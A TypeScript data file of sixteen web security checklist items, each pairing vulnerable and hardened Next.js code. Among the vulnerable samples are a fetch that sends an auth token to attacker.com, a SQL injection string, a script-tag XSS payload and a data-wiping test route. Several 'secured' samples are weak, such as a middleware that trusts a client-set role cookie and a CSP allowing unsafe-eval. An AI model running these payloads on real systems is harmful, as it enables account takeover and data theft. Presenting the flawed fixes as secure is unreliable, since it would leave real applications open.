import { SecurityCheckItem } from '@/types';

export const SECURITY_AUDIT_ITEMS: SecurityCheckItem[] = [
  // 13 Must-Have Controls
  {
    id: 1,
    title: 'Hide API Keys & Secrets',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'Secret Isolation',
    vulnerableState: {
      headline: 'NEXT_PUBLIC_ Prefix Leaks Private Keys into Browser Bundle',
      description:
        'Prefixing backend secret keys with NEXT_PUBLIC_ embeds them directly into client-side JS chunks. Anyone viewing Network tab or Source code can extract them.',
      code: `// ❌ VULNERABLE: Exposed in client bundle!
// .env.local
NEXT_PUBLIC_STRIPE_SECRET_KEY=sk_live_94821a06fc00
NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOi...

// Any client component can inspect:
console.log(process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY);`,
      risk: 'Critical',
      impact: 'Complete financial/database compromise via unauthorized billing and admin API operations.',
    },
    securedState: {
      headline: 'Private Environment Variables Isolated to Server Runtime',
      description:
        'Omit NEXT_PUBLIC_ prefix. Only access secret keys inside Server Components, Route Handlers, or Server Actions.',
      code: `// ✅ SECURED: Isolated to Server Runtime
// .env.local
STRIPE_SECRET_KEY=sk_live_94821a06fc00
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOi...

// src/app/api/checkout/route.ts (Server-only)
import Stripe from 'stripe';
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);`,
      mitigation: 'Secrets remain strictly inside Node.js/Edge runtime; client bundle contains 0 bytes of private keys.',
      standard: 'OWASP A01:2021 - Broken Access Control',
    },
    simulationType: 'env_leak',
  },
  {
    id: 2,
    title: 'Passwords Off GitHub & Git Scans',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'Git Hygiene',
    vulnerableState: {
      headline: '.env.local Committed to Public / Team Git Repository',
      description:
        'Missing .env.local in .gitignore leads to automated bots cloning credentials within 30 seconds of push.',
      code: `// ❌ VULNERABLE: Git status reveals tracked env files!
# git status
Changes to be committed:
  modified:   .env.local
  modified:   id_rsa_deploy_key.pem`,
      risk: 'Critical',
      impact: 'Public exposure of cloud provider keys resulting in massive compute billing charges.',
    },
    securedState: {
      headline: '.gitignore & Automated Pre-Commit Gitleaks / TruffleHog',
      description:
        'Strict .gitignore patterns and git hooks block any accidental commit containing token patterns.',
      code: `// ✅ SECURED: Root .gitignore
.env*.local
.env
*.pem
*.key
.vercel

# .husky/pre-commit
npx gitleaks protect --staged --verbose`,
      mitigation: 'Pre-commit hook parses git diff against 150+ regex secret patterns before commit SHA creation.',
      standard: 'Git Secret Protection Standard',
    },
    simulationType: 'git_scanner',
  },
  {
    id: 3,
    title: 'Lock the Admin Page (RBAC & Middleware)',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'Edge Auth Guard',
    vulnerableState: {
      headline: 'Unprotected Admin Route Relying on Hidden Links',
      description:
        'Admin dashboard pages accessible without edge middleware checks. Anyone typing `/admin` gets access.',
      code: `// ❌ VULNERABLE: src/app/admin/page.tsx
export default function AdminPage() {
  // Page renders immediately without verifying session or role!
  return <div>Welcome to Admin Financial Controls</div>;
}`,
      risk: 'Critical',
      impact: 'Arbitrary users can access company metrics, user databases, and system configuration.',
    },
    securedState: {
      headline: 'Next.js Edge Middleware with Role-Based Access Control',
      description:
        'Edge middleware intercepts request before page rendering. Validates cryptographic JWT and redirects unauthorized users.',
      code: `// ✅ SECURED: src/middleware.ts
import { NextResponse, type NextRequest } from 'next/server';

export function middleware(req: NextRequest) {
  const session = req.cookies.get('session_token')?.value;
  const isSuperAdmin = req.cookies.get('user_role')?.value === 'admin';

  if (req.nextUrl.pathname.startsWith('/admin')) {
    if (!session || !isSuperAdmin) {
      return NextResponse.redirect(new URL('/login?error=unauthorized', req.url));
    }
  }
  return NextResponse.next();
}

export const config = { matcher: ['/admin/:path*'] };`,
      mitigation: 'Centralized edge guard intercepts unauthorized visits before any server component executes.',
      standard: 'NIST SP 800-162 (ABAC & RBAC)',
    },
    simulationType: 'admin_lock',
  },
  {
    id: 4,
    title: 'Proper Login & Session Cookie Flags',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'Session Hardening',
    vulnerableState: {
      headline: 'Session Token Saved in localStorage (Vulnerable to XSS)',
      description:
        'Storing JWT tokens in `localStorage.setItem("token", jwt)` allows any third-party script or XSS flaw to read `document.cookie` or storage.',
      code: `// ❌ VULNERABLE: Client-side storage accessible to XSS
localStorage.setItem('auth_token', response.token);

// Any injected malicious script can execute:
fetch('https://attacker.com/steal?t=' + localStorage.getItem('auth_token'));`,
      risk: 'High',
      impact: 'Session hijacking and account takeover without user password knowledge.',
    },
    securedState: {
      headline: 'HttpOnly, Secure, SameSite=Strict Cookie Storage',
      description:
        'Cookies flagged with HttpOnly cannot be read by JavaScript `document.cookie`. SameSite=Strict prevents CSRF.',
      code: `// ✅ SECURED: Next.js cookies API
import { cookies } from 'next/headers';

cookies().set({
  name: 'session_token',
  value: secureSessionToken,
  httpOnly: true, // Prevents JS/XSS reads
  secure: process.env.NODE_ENV === 'production', // HTTPS only
  sameSite: 'strict', // Blocks cross-origin CSRF
  path: '/',
  maxAge: 60 * 60 * 24, // 24 hours
});`,
      mitigation: 'Browser restricts token read access exclusively to internal HTTP request headers.',
      standard: 'OWASP Session Management Cheat Sheet',
    },
    simulationType: 'cookie_flags',
  },
  {
    id: 5,
    title: 'Users See Only Their Data (RLS & Anti-IDOR)',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'Anti-IDOR & RLS',
    vulnerableState: {
      headline: 'Insecure Direct Object Reference (?userId=2 Leak)',
      description:
        'Backend queries data based on URL query parameter or request body ID without checking session ownership.',
      code: `// ❌ VULNERABLE: IDOR Flaw
// GET /api/invoices?userId=42
export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const userId = searchParams.get('userId'); // Attacker changes 42 to 43!
  const invoices = await db.query('SELECT * FROM invoices WHERE user_id = $1', [userId]);
  return Response.json(invoices);
}`,
      risk: 'Critical',
      impact: 'Attacker enumerates sequential user IDs to scrape private invoices, orders, and emails of all users.',
    },
    securedState: {
      headline: 'Session-Scoped DB Queries & Row-Level Security',
      description:
        'Database query ignores untrusted query params and filters strictly by the authenticated session user ID.',
      code: `// ✅ SECURED: Session-Enforced Scoping
export async function GET(req: Request) {
  const session = await getAuthenticatedSession();
  if (!session) return new Response('Unauthorized', { status: 401 });

  // Strictly bound to verified session.id!
  const invoices = await db.query(
    'SELECT * FROM invoices WHERE user_id = $1',
    [session.user.id]
  );
  return Response.json(invoices);
}`,
      mitigation: 'Queries are deterministically scoped to session identity. Database Row-Level Security rejects mismatched access.',
      standard: 'OWASP A01:2021 - Broken Access Control / IDOR',
    },
    simulationType: 'idor_rls',
  },
  {
    id: 6,
    title: 'Check Every Form (Dual Zod Validation)',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'Dual Validation',
    vulnerableState: {
      headline: 'Client-Only HTML5 Validation Bypassed with curl',
      description:
        'Relying on `<input required type="email" />` without server-side validation. Attackers bypass client UI with curl/Postman.',
      code: `// ❌ VULNERABLE: Direct database write without server validation
export async function saveProfile(formData: FormData) {
  'use server';
  const bio = formData.get('bio'); // Malicious payload: <script>alert(1)</script>
  await db.users.update({ data: { bio: String(bio) } });
}`,
      risk: 'High',
      impact: 'Stored Cross-Site Scripting (XSS), SQL injection attempts, and corrupt invalid schema entries.',
    },
    securedState: {
      headline: 'Zod Schema Parsing in Next.js Server Actions',
      description:
        'Strict schema enforces data types, lengths, string sanitation, and email structure on every Server Action invocation.',
      code: `// ✅ SECURED: Strict Server Action Zod Parsing
'use server';
import { z } from 'zod';

const ProfileSchema = z.object({
  bio: z.string().trim().max(300, 'Bio max 300 characters'),
  email: z.string().email().toLowerCase(),
});

export async function saveProfile(formData: FormData) {
  const result = ProfileSchema.safeParse({
    bio: formData.get('bio'),
    email: formData.get('email'),
  });

  if (!result.success) {
    return { success: false, errors: result.error.flatten().fieldErrors };
  }
  await db.users.update({ data: result.data });
  return { success: true };
}`,
      mitigation: 'All untrusted input is parsed against strict cryptographic-grade schemas before database interaction.',
      standard: 'OWASP Input Validation Standard',
    },
    simulationType: 'zod_validation',
  },
  {
    id: 7,
    title: 'Stop Login Spam (Rate-Limiting & IP Throttling)',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'Brute-Force Guard',
    vulnerableState: {
      headline: 'Unlimited Login Requests Allowing Dictionary Attacks',
      description:
        'Auth route processes unlimited attempts per second. Credential stuffing bots test millions of leaked passwords.',
      code: `// ❌ VULNERABLE: No Rate Limiting
export async function POST(req: Request) {
  const { email, password } = await req.json();
  const valid = await checkPassword(email, password);
  // Allows 1,000 attempts per minute without delay!
}`,
      risk: 'High',
      impact: 'Account takeover via brute-force dictionary attacks and Denial of Service (DoS) on password hashing CPU.',
    },
    securedState: {
      headline: 'Token-Bucket Sliding Window Throttling (Upstash / Redis)',
      description:
        'Limits IP or user identifier to 5 attempts per 15 minutes. Automatically locks out repeated failures.',
      code: `// ✅ SECURED: Edge Rate-Limiting
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, '15 m'), // 5 requests per 15 minutes
});

export async function POST(req: Request) {
  const ip = req.headers.get('x-forwarded-for') ?? '127.0.0.1';
  const { success, remaining, reset } = await ratelimit.limit(\`auth_\${ip}\`);

  if (!success) {
    return new Response('Too Many Requests. Lockout active.', {
      status: 429,
      headers: { 'Retry-After': String(Math.ceil((reset - Date.now()) / 1000)) },
    });
  }
}`,
      mitigation: 'Brute-force velocity is choked to mathematically negligible rates.',
      standard: 'OWASP Automated Threat Handbook',
    },
    simulationType: 'rate_limiter',
  },
  {
    id: 8,
    title: 'HTTPS Everywhere & Strict HSTS Headers',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'TLS & Transport',
    vulnerableState: {
      headline: 'Cleartext HTTP Allowing Man-In-The-Middle Eavesdropping',
      description:
        'Traffic transits over unencrypted port 80 or lacks HSTS headers, enabling SSL stripping attacks on public Wi-Fi.',
      code: `// ❌ VULNERABLE: No Strict-Transport-Security header
// HTTP requests allow packets to be inspected in transit
http://api.myapp.com/login`,
      risk: 'High',
      impact: 'Interception of session cookies, passwords, and sensitive client payloads by local network sniffers.',
    },
    securedState: {
      headline: 'Forced TLS 1.3 & HTTP Strict Transport Security (HSTS)',
      description:
        'Vercel enforces automatic HTTPS certificates, paired with Next.js HSTS configuration headers.',
      code: `// ✅ SECURED: next.config.mjs Security Headers
const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Strict-Transport-Security',
            value: 'max-age=63072000; includeSubDomains; preload',
          },
        ],
      },
    ];
  },
};`,
      mitigation: 'Browser is permanently instructed never to send cleartext requests to the domain for 2 years.',
      standard: 'RFC 6797 (HSTS)',
    },
    simulationType: 'https_hsts',
  },
  {
    id: 9,
    title: 'Hash Passwords (Argon2id & bcrypt)',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'Cryptographic Hashing',
    vulnerableState: {
      headline: 'Plaintext or Weak MD5/SHA1 Password Storage',
      description:
        'Storing passwords in plain text or using unsalted MD5 hashes easily reversed with rainbow tables.',
      code: `// ❌ VULNERABLE: Plaintext or fast hash
// INSERT INTO users (email, password) VALUES ('alex@test.com', 'Hunter2!')
const hash = crypto.createHash('md5').update(password).digest('hex');`,
      risk: 'Critical',
      impact: 'Any database leak immediately exposes customer credentials across all third-party services.',
    },
    securedState: {
      headline: 'Salted Argon2id or bcrypt (Work Factor ≥ 12)',
      description:
        'Adaptive, memory-hard cryptographic hashing functions resist GPU/ASIC parallelized cracking.',
      code: `// ✅ SECURED: Salted bcrypt hashing
import bcrypt from 'bcryptjs';

const SALT_ROUNDS = 12;
const passwordHash = await bcrypt.hash(rawPassword, SALT_ROUNDS);

// Verification:
const isMatch = await bcrypt.compare(attemptPassword, user.passwordHash);`,
      mitigation: 'Cryptographic salt and deliberate CPU work factor render brute-force cracking computationally infeasible.',
      standard: 'NIST Special Publication 800-63B',
    },
    simulationType: 'password_hash',
  },
  {
    id: 10,
    title: 'Lock the Database (Parameterized Queries)',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'Anti-SQLi',
    vulnerableState: {
      headline: 'SQL Injection via String Concatenation',
      description:
        'Directly concatenating user input into raw SQL queries allows attackers to execute arbitrary database commands.',
      code: `// ❌ VULNERABLE: Direct String Interpolation
const query = \`SELECT * FROM users WHERE email = '\${userInput}'\`;
// Attacker input: ' OR '1'='1' --
// Executes: SELECT * FROM users WHERE email = '' OR '1'='1' --'`,
      risk: 'Critical',
      impact: 'Full database exfiltration, table deletion (DROP TABLE), and administrative impersonation.',
    },
    securedState: {
      headline: 'Parameterized Queries & Modern Type-Safe ORMs (Prisma / Drizzle)',
      description:
        'SQL engine treats user input strictly as literal values, never as executable SQL code grammar.',
      code: `// ✅ SECURED: Parameterized Query
const query = 'SELECT id, email, role FROM users WHERE email = $1';
const result = await db.query(query, [userInput]);

// Or using modern ORM:
const user = await prisma.user.findUnique({
  where: { email: userInput },
});`,
      mitigation: 'Query structure is pre-compiled; user input cannot alter syntax trees.',
      standard: 'OWASP A03:2021 - Injection',
    },
    simulationType: 'sql_injection',
  },
  {
    id: 11,
    title: 'Automated Daily Backups & PITR',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'Disaster Recovery',
    vulnerableState: {
      headline: 'Zero Backup Strategy Relying Solely on Primary Disk',
      description:
        'A single rogue script, accidental TRUNCATE query, or cloud zone failure causes permanent, irreversible data loss.',
      code: `// ❌ DANGEROUS: No automated snapshot or replication
// If production database corrupts, recovery time = ∞`,
      risk: 'Critical',
      impact: 'Total permanent loss of customer accounts, transactional history, and business continuity.',
    },
    securedState: {
      headline: 'Continuous WAL Streaming with Point-In-Time Recovery (PITR)',
      description:
        'Automated Write-Ahead Logging allows rolling back the database to the exact second prior to an incident.',
      code: `// ✅ SECURED: Automated Backup Schedule
// Provider: Neon / Supabase / AWS RDS
{
  "continuous_backup": true,
  "pitr_retention_days": 14,
  "daily_snapshot_cron": "0 2 * * *",
  "multi_region_replication": true
}`,
      mitigation: 'RPO (Recovery Point Objective) < 1 minute; RTO (Recovery Time Objective) < 15 minutes.',
      standard: 'ISO 27001 Backup & Disaster Recovery Policy',
    },
    simulationType: 'backup_pitr',
  },
  {
    id: 12,
    title: 'Update Packages & Continuous `npm audit`',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'Supply-Chain Defense',
    vulnerableState: {
      headline: 'Outdated Dependencies with Known Critical CVEs',
      description:
        'Neglecting `npm audit` leaves unpatched remote code execution (RCE) or prototype pollution flaws active in dependencies.',
      code: `// ❌ VULNERABLE: package.json with obsolete versions
"dependencies": {
  "axios": "0.18.0", // Known CVE-2020-28168 SSRF flaw
  "next": "12.0.0"   // Known prototype pollution
}`,
      risk: 'High',
      impact: 'Remote code execution via known public exploit scripts targeting vulnerable libraries.',
    },
    securedState: {
      headline: 'CI-Gated `npm audit` & Dependabot Auto-Patching',
      description:
        'Automated dependency bot monitors GitHub Security Advisories and blocks builds on moderate+ vulnerabilities.',
      code: `// ✅ SECURED: CI Verification Step
# package.json test script
"scripts": {
  "prebuild": "npm audit --audit-level=high"
}

# .github/workflows/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"`,
      mitigation: 'Zero-day security patches are integrated and verified continuously.',
      standard: 'OWASP A06:2021 - Vulnerable and Outdated Components',
    },
    simulationType: 'npm_audit',
  },
  {
    id: 13,
    title: 'Full Pre-Flight Security Headers & CSP',
    category: 'Must-Have Security',
    isAntiPattern: false,
    citationBadge: 'HTTP Defense In Depth',
    vulnerableState: {
      headline: 'Missing Security Headers Permitting Clickjacking & XSS',
      description:
        'App lacks Content-Security-Policy (CSP) and X-Frame-Options, allowing malicious sites to iframe the application.',
      code: `// ❌ VULNERABLE: Default HTTP Response with no hardening headers
HTTP/1.1 200 OK
Content-Type: text/html
// Missing CSP, X-Frame-Options, X-Content-Type-Options`,
      risk: 'Medium',
      impact: 'Clickjacking (users tricked into clicking hidden actions) and malicious external script injection.',
    },
    securedState: {
      headline: 'Next.js Security Header Hardening Suite',
      description:
        'Comprehensive CSP, framing restrictions, and MIME-sniffing prohibitions injected on all responses.',
      code: `// ✅ SECURED: next.config.mjs
const securityHeaders = [
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; style-src 'self' 'unsafe-inline';",
  },
];`,
      mitigation: 'Hardens browser execution context against clickjacking and unauthorized script loading.',
      standard: 'OWASP Secure Headers Project',
    },
    simulationType: 'owasp_headers',
  },

  // 3 Launch Anti-Patterns to Eliminate
  {
    id: 14,
    title: '❌ NO Debug Mode in Production',
    category: 'Launch Anti-Pattern',
    isAntiPattern: true,
    citationBadge: 'NODE_ENV Enforcer',
    vulnerableState: {
      headline: 'NODE_ENV=development or Verbose Debug Flags in Production',
      description:
        'Leaving debug flags active causes server to print memory addresses, SQL query strings, and environment state.',
      code: `// ❌ ANTI-PATTERN: Debug logs active in production
if (process.env.DEBUG === 'true' || true) {
  console.log('INTERNAL DB POOL:', pool.options);
  console.log('USER PASS HASH:', user.hash);
}`,
      risk: 'High',
      impact: 'Information disclosure that gives attackers exact architectural maps and credentials.',
    },
    securedState: {
      headline: 'Strict NODE_ENV=production & Stripped Loggers',
      description:
        'Production builds automatically strip debug logs, enforce production optimizations, and silence internal telemetry.',
      code: `// ✅ PRODUCTION-READY:
// next.config.mjs
export default {
  compiler: {
    removeConsole: process.env.NODE_ENV === 'production' ? { exclude: ['error'] } : false,
  },
};

// Runtime check
if (process.env.NODE_ENV !== 'production') {
  console.log('Dev debug only');
}`,
      mitigation: 'All developer debugging traces are compiled away from client and server production distributions.',
      standard: 'Next.js Production Deployment Guide',
    },
    simulationType: 'debug_mode',
  },
  {
    id: 15,
    title: '❌ NO Exposed Error Details & Stack Traces',
    category: 'Launch Anti-Pattern',
    isAntiPattern: true,
    citationBadge: 'Sanitized Boundaries',
    vulnerableState: {
      headline: 'Raw System Exceptions Leaking File Paths and Stack Traces',
      description:
        'When an error occurs, the server responds with raw exception details including full server disk directories.',
      code: `// ❌ ANTI-PATTERN: Raw exception dumped to user
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack, // Leaks: /var/www/app/src/db/connect.ts:42:12
  });
});`,
      risk: 'High',
      impact: 'Discloses backend technology stack versions, file structures, and database column names.',
    },
    securedState: {
      headline: 'Next.js error.tsx Sanitized Boundary with Digest Tracking',
      description:
        'Next.js logs the full trace internally to error monitors (Sentry), while presenting a clean, safe UI to end users.',
      code: `// ✅ PRODUCTION-READY: src/app/error.tsx
'use client';

export default function GlobalError({
  error,
  reset,
}: {
  error: Error & { digest?: string };
  reset: () => void;
}) {
  return (
    <div className="p-8 text-center bg-slate-900 border border-slate-800 rounded-xl">
      <h2 className="text-xl font-bold text-white">Something went wrong</h2>
      <p className="text-slate-400 text-sm mt-2">
        Our engineering team has been notified. Error Code: {error.digest || 'ERR_SYS'}
      </p>
      <button onClick={reset} className="btn-cyan mt-4">Try Again</button>
    </div>
  );
}`,
      mitigation: 'Internal paths are hidden behind anonymous hash digests; users see a polished recovery screen.',
      standard: 'OWASP A05:2021 - Security Misconfiguration',
    },
    simulationType: 'error_boundary',
  },
  {
    id: 16,
    title: '❌ NO Unused Code & Leftover Test Routes',
    category: 'Launch Anti-Pattern',
    isAntiPattern: true,
    citationBadge: 'Tree-Shaking & Cleanup',
    vulnerableState: {
      headline: 'Orphaned Test Endpoints (/api/test-db, /debug/drop-users)',
      description:
        'Developers create temporary helper routes during testing and forget to delete them before deployment.',
      code: `// ❌ ANTI-PATTERN: Forgotten test route in src/app/api/test-db/route.ts
export async function GET() {
  // Developer created this to test local DB reset
  await db.query('TRUNCATE users CASCADE');
  return Response.json({ status: 'db wiped' });
}`,
      risk: 'Critical',
      impact: 'Anyone discovering the route can trigger destructive admin actions with no authorization.',
    },
    securedState: {
      headline: 'Automated Tree-Shaking, ESLint & Route Route Pruning',
      description:
        'Strict ESLint rules and CI checks ensure zero orphaned test files exist in the production branch.',
      code: `// ✅ PRODUCTION-READY:
# 1. ESLint enforces no-unused-vars & no test routes in production
npm run lint

# 2. Automated route crawler ensures only authorized endpoints exist
# 3. Next.js compiler tree-shakes all unused JS functions`,
      mitigation: 'Zero dead code or unauthenticated backdoor routes can survive automated build pipelines.',
      standard: 'Clean Code & Production Release Hygiene',
    },
    simulationType: 'unused_code',
  },
];
